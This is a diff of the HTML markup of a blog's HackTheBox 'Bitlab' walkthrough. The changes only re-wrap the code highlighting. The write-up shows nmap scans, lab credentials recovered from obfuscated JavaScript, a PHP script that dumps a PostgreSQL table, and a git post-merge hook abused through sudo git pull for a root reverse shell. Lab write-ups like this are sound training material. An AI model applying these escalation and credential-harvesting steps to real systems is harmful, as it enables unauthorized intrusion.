@@ -3,34 +3,37 @@
 &lt;p>As the name suggests this box had a instance of gitlab where the initial foothold involves getting credentials from obfuscated javascript and once logged into the gitlab instance we abuse webhooks to add our own code and execute it to get a reverse shell. Read on to see how I able to root the box.&lt;/p>
 &lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;p>As usual I start with a quick nmap scan to find open ports and then run a second scan for service and version detection.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.114
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.21s latency&lt;span style="color:#f92672">)&lt;/span>.
-Not shown: &lt;span style="color:#ae81ff">65533&lt;/span> filtered ports
-PORT STATE SERVICE
-22/tcp open ssh
-80/tcp open http
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thorough scan:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -Pn -sC -sV -p 22,80 -oA nmap/bitlab 10.10.10.114
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.47s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-80/tcp open http nginx
-| http-robots.txt: &lt;span style="color:#ae81ff">55&lt;/span> disallowed entries &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span> shown&lt;span style="color:#f92672">)&lt;/span>
-| / /autocomplete/users /search /api /admin /profile
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help
-|_/s/ /snippets/new /snippets/*/edit
-|_http-server-header: nginx
-| http-title: Sign in &lt;span style="color:#ae81ff">\x&lt;/span>C2&lt;span style="color:#ae81ff">\x&lt;/span>B7 GitLab
-|_Requested resource was http://10.10.10.114/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="gitlab">Gitlab&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.21s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">65533&lt;/span> filtered ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Thorough scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -Pn -sC -sV -p 22,80 -oA nmap/bitlab 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.114
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.47s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-robots.txt: &lt;span style="color:#ae81ff">55&lt;/span> disallowed entries &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span> shown&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| / /autocomplete/users /search /api /admin /profile
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_/s/ /snippets/new /snippets/*/edit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-title: Sign in &lt;span style="color:#ae81ff">\x&lt;/span>C2&lt;span style="color:#ae81ff">\x&lt;/span>B7 GitLab
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_Requested resource was http://10.10.10.114/users/sign_in
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-trane-info: Problem with XML parsing of /evox/about
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="gitlab">Gitlab&lt;/h2>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-01.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>After trying out some simple combinations of username and password that didn&amp;rsquo;t work I decided to click on links on the home page and see if I&amp;rsquo;ll get a version number. When I opened the help link I got this.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-02.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
@@ -38,13 +41,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-03.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;!-- raw HTML omitted -->
 &lt;p>The deobfuscated javascript shows a username and password.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#a6e22e">javascript&lt;/span>&lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#66d9ef">function&lt;/span> ()
-{
-&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_login&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getElementById&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;clave&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_password&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;11des0081x&amp;#34;&lt;/span>];
-document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">3&lt;/span>];
-document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">4&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">5&lt;/span>];
-})()
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>After logging in there are two projects.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">javascript&lt;/span>&lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#66d9ef">function&lt;/span> ()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_login&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;getElementById&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;clave&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user_password&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;11des0081x&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">3&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]](&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">4&lt;/span>])[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:#ae81ff">5&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After logging in there are two projects.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-04.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>My user has Developer role on the Profile repo and Reporter role on the Deployer repo. I can&amp;rsquo;t edit the deployer but looking at the files the readme has a link about gitlab webhooks.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-05.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
@@ -68,42 +71,49 @@ document[&lt;span style="color:#a6e22e">_0x4b18&lt;/span>[&lt;span style="color:
 &lt;p>Checking on the server we indeed have a postgresql instance running locally on port 5432.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-13.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>After some tweaking I was able to get a script working that would read the db.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
-$host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;host = 127.0.0.1&amp;#34;&lt;/span>;
-$port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;port = 5432&amp;#34;&lt;/span>;
-$dbname &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dbname = profiles&amp;#34;&lt;/span>;
-$credentials &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;user = profiles password=profiles&amp;#34;&lt;/span>;
-$db &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_connect&lt;/span>( &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">$host&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$port&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$dbname&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$credentials&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> );
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$db) {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Error : Unable to open database&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-} &lt;span style="color:#66d9ef">else&lt;/span> {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Opened database successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-}
-$sql &lt;span style="color:#f92672">=&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">EOF&lt;/span>
-&lt;span style="color:#a6e22e">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">from&lt;/span> &lt;span style="color:#a6e22e">profiles&lt;/span>;
-&lt;span style="color:#a6e22e">EOF&lt;/span>;
-$ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_query&lt;/span>($db, $sql);
-&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$ret) {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">pg_last_error&lt;/span>($db);
-&lt;span style="color:#66d9ef">exit&lt;/span>;
-}
-&lt;span style="color:#66d9ef">while&lt;/span>($row &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_fetch_row&lt;/span>($ret)) {
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-}
-&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Operation done successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
-&lt;span style="color:#a6e22e">pg_close&lt;/span>($db);
-&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the db I found a password which appears to be base64 encoded but the trick was to use it as it is and not decode it for it to work.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;host = 127.0.0.1&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;port = 5432&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $dbname &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;dbname = profiles&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $credentials &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;user = profiles password=profiles&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $db &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_connect&lt;/span>( &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">$host&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$port&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$dbname&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">$credentials&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> );
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$db) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Error : Unable to open database&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Opened database successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $sql &lt;span style="color:#f92672">=&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">EOF&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">from&lt;/span> &lt;span style="color:#a6e22e">profiles&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">EOF&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_query&lt;/span>($db, $sql);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$ret) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">pg_last_error&lt;/span>($db);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>($row &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_fetch_row&lt;/span>($ret)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Operation done successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pg_close&lt;/span>($db);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the db I found a password which appears to be base64 encoded but the trick was to use it as it is and not decode it for it to work.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-15.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;h2 id="getting-root">Getting Root&lt;/h2>
 &lt;p>This part was interesting as I had never heard of this technique before. The user www-data had sudo rights to run git pull.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-16.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>In git there are scripts called git hooks which can run automatically before or after git actions like commits. You can configure them in .git/hooks. For this case I&amp;rsquo;ll use &lt;strong>post-merge&lt;/strong> since when git pull is run a merge action is done.&lt;/p>
 &lt;p>Since we can&amp;rsquo;t edit the current folder copy the profile repo to a world writeable directory like /tmp and create the post-merge script in hooks, the script will give a reverse shell.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cp -r /var/www/html/profile /tmp
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cp -r /var/www/html/profile /tmp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-17.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>After making this file executable, we just have to make any change to the repo on the gitlab instance like creating a txt file and make sure we merge it to master. Once that is done, we can run sudo git pull and get a root reverse shell.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-18.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
